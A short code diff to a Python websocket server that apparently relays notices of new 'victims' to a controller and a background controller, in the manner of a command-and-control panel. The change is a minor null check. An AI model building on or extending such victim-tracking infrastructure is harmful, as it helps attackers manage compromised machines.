@@ -33,6 +33,7 @@ async def handler(websocket):
         rdid=victim_id
         if controller:
             await controller.send(f"NEW_VICTIM:{victim_id}")
+        if background_controller:
             await background_controller.send(f"NEW_VICTIM:{victim_id}")
         
         try:
@@ -115,6 +116,7 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 
 
